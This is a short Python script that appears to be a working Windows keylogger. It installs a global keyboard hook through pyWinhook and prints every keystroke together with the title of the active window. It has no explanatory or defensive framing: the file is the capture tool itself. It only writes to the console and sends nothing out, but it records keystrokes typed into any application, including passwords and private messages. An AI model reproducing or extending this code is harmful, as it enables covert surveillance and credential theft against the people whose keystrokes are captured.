import win32gui
import pythoncom
import pyWinhook as pyHook

curWindow = None
def getCurProc():
    global curWindow
    try:
        hwnd = win32gui.GetForegroundWindow()
        winTitle = win32gui.GetWindowText(hwnd)
        if winTitle != curWindow:
            curWindow = winTitle
            print('\n[%s]' %winTitle)
    except:
        print('\n[Unknown Window]')
        pass

def OnKeyboardEvent(event):
    getCurProc()
    print('+++ Key: ', event.Key, end='')
    return True

def main():
    hm = pyHook.HookManager()
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()

if __name__ == '__main__':
    main()
